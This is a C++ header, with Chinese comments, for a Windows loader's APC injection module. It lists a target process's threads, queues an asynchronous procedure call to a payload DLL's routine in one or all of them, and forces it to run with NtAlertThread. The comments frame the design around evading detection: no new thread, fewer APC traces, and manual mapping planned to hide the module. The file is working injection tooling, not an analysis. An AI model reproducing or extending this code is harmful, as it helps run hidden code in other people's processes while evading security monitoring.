// loader/apc_inject.hpp —— APC 注入（不创建新线程）
//
// 传统注入流程：
//   CreateRemoteThread(kernel32!LoadLibraryW, 路径)   ← 新线程
//
// APC 流程：
//   1. 目标已经有 ikpayload.dll（之前注入过，或 loader 用别的方式放进去）
//   2. 找到目标的一个已有线程
//   3. NtQueueApcThread(那个线程, apc_entry)
//   4. NtAlertThread 强制唤醒它
//
// 关键区别：**第 1 步还是要注入 DLL**。
// APC 解决的是"怎么触发"，不是"怎么放进去"。
//
// 所以完整的无新线程方案需要两步配合：
//   A. 用 manual map 放 DLL（不走 LoadLibrary，不产生模块痕迹）
//   B. 用 APC 触发它（不用 CreateRemoteThread，不产生线程痕迹）
//
// 本文件实现 B。A 需要 manual map（P2 的后续工作）。
#pragma once

#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>

#include <cstdint>

// 本文件是 loader 侧（在外部进程里跑），不能用 ik::api（那是 PEB 遍历，
// 只能查自己进程的模块）。所以用 GetProcAddress 解析 ntdll 函数。
namespace apr {

using NtOpenThreadFn = LONG(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
using NtQueueApcFn = LONG(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, ULONG);
using NtAlertThreadFn = LONG(NTAPI*)(HANDLE);
using NtCloseFn = LONG(NTAPI*)(HANDLE);

struct Nt {
    NtOpenThreadFn openThread = nullptr;
    NtQueueApcFn queueApc = nullptr;
    NtAlertThreadFn alertThread = nullptr;
    NtCloseFn close = nullptr;

    bool resolve() {
        HMODULE nt = GetModuleHandleW(L"ntdll.dll");
        if (!nt) return false;
        openThread = reinterpret_cast<NtOpenThreadFn>(GetProcAddress(nt, "NtOpenThread"));
        queueApc = reinterpret_cast<NtQueueApcFn>(GetProcAddress(nt, "NtQueueApcThread"));
        alertThread = reinterpret_cast<NtAlertThreadFn>(GetProcAddress(nt, "NtAlertThread"));
        close = reinterpret_cast<NtCloseFn>(GetProcAddress(nt, "NtClose"));
        return openThread && queueApc && alertThread;
    }
};

// 枚举目标进程的线程
inline int enum_threads(DWORD pid, DWORD* tids, int maxTids) {
    if (!tids || maxTids <= 0) return 0;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    int n = 0;
    THREADENTRY32 te{};
    te.dwSize = sizeof(te);
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            if (n >= maxTids) break;
            tids[n++] = te.th32ThreadID;
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return n;
}

enum class Result : int {
    Ok = 0,
    NoThreads = -1,
    OpenFailed = -2,
    QueueFailed = -3,
    AlertFailed = -4,
};

inline const char* result_name(Result r) {
    switch (r) {
        case Result::Ok: return "ok";
        case Result::NoThreads: return "no_threads";
        case Result::OpenFailed: return "open_failed";
        case Result::QueueFailed: return "queue_failed";
        case Result::AlertFailed: return "alert_failed";
    }
    return "?";
}

// 向目标进程的所有已有线程排队 APC
//
// 为什么排给"所有"线程：
//   我们不知道哪个线程会进入 alertable wait。全排一遍能最大化命中率。
//   代价：每个线程都要 OpenThread/QueueApc/CloseThread，是 N 次系统调用，
//   且每次都会在那个线程的 APC 队列里留一条记录（可被检测）。
//
// 更好的做法：先 NtAlertThread 一个线程，成功后再排 APC。
// 但 NtAlertThread 需要我们持有 THREAD_SUSPEND_RESUME 权限，
// 而目标可能是受保护进程（拒绝这种权限）。
//
// 所以实现两种策略，调用方选：
//   Strategy::AllThreads  —— 全排，命中率高，痕迹多
//   Strategy::SingleThenAlert —— 只排一个，靠 alert 强制唤醒，痕迹少
enum class Strategy { AllThreads, SingleThenAlert };

inline Result queue_apc(DWORD pid, uint64_t apcRoutineAddr, uint64_t param,
                        Strategy strat, int* outQueued) {
    if (outQueued) *outQueued = 0;

    Nt nt;
    if (!nt.resolve()) return Result::OpenFailed;

    DWORD tids[256];
    const int n = enum_threads(pid, tids, 256);
    if (n <= 0) return Result::NoThreads;

    int queued = 0;

    // 只排一个 + alert
    if (strat == Strategy::SingleThenAlert) {
        // 选最后一个（通常是主线程，最可能在消息循环里等）
        const DWORD tid = tids[n - 1];

        OBJECT_ATTRIBUTES oa{};
        oa.Length = sizeof(oa);
        CLIENT_ID cid{};
        cid.UniqueThread = reinterpret_cast<HANDLE>(static_cast<uintptr_t>(tid));

        HANDLE h = nullptr;
        // THREAD_SET_CONTEXT(0x10) | THREAD_SUSPEND_RESUME(0x2) | THREAD_QUERY(0x40)
        if (nt.openThread(&h, 0x0010 | 0x0002 | 0x0040, &oa, &cid) < 0 || !h) {
            return Result::OpenFailed;
        }

        const LONG qst = nt.queueApc(h,
                                     reinterpret_cast<PVOID>(apcRoutineAddr),
                                     reinterpret_cast<PVOID>(param),
                                     nullptr, 0);
        if (qst < 0) {
            nt.close(h);
            return Result::QueueFailed;
        }
        ++queued;

        // 强制唤醒，让它在下次进入 alertable wait 时立刻执行
        if (nt.alertThread(h) < 0) {
            nt.close(h);
            if (outQueued) *outQueued = queued;
            return Result::AlertFailed;
        }

        nt.close(h);
        if (outQueued) *outQueued = queued;
        return Result::Ok;
    }

    // 全排
    for (int i = 0; i < n; ++i) {
        OBJECT_ATTRIBUTES oa{};
        oa.Length = sizeof(oa);
        CLIENT_ID cid{};
        cid.UniqueThread = reinterpret_cast<HANDLE>(static_cast<uintptr_t>(tids[i]));

        HANDLE h = nullptr;
        if (nt.openThread(&h, 0x0010 | 0x0002, &oa, &cid) < 0 || !h) continue;

        if (nt.queueApc(h,
                        reinterpret_cast<PVOID>(apcRoutineAddr),
                        reinterpret_cast<PVOID>(param),
                        nullptr, 0) >= 0) {
            ++queued;
            nt.alertThread(h);   // 尽力唤醒，失败不阻断
        }
        nt.close(h);
    }

    if (outQueued) *outQueued = queued;
    return queued > 0 ? Result::Ok : Result::QueueFailed;
}

}  // namespace apr
